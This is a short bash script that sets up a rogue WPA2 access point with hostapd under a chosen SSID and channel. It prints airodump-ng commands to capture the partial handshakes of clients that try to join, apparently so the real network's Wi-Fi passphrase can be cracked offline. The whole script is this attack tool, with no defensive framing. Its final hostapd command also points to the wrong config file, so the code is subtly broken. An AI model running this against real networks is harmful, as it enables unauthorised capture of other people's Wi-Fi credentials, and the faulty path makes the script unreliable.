#!/bin/bash
if [[ $# -eq 0 ]] ; then
	printf "This script requires arguments:\n\tFirst argument: desired access point name (with no spaces)\n\tsecond argument: desired channel number\n\tthird argument: interface for airodump to run on\n\tfourth argument: interface for hostapd to run the AP on\n\tfifth argument: output file for airodump to use\n\n\tYou must also have hostapd and the aircrack suite installed, along with relevant wifi cards and drivers"
	exit 0
fi
printf "hw_mode=g\nchannel=NUMBER\ndriver=nl80211\nssid=NAME\nauth_algs=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nwpa_passphrase=aouinuhwelafjnda" > /etc/hostapd/half-handshake-default.conf
sed "s/NUMBER/$2/g" /etc/hostapd/half-handshake-default.conf | sed "s/NAME/$1/g"  > /etc/hostapd/$1.conf

printf "sudo airodump-ng $3 -c $2 -w $5\nsudo hostapd -d /etc/hostapd/$2.conf -i $4"
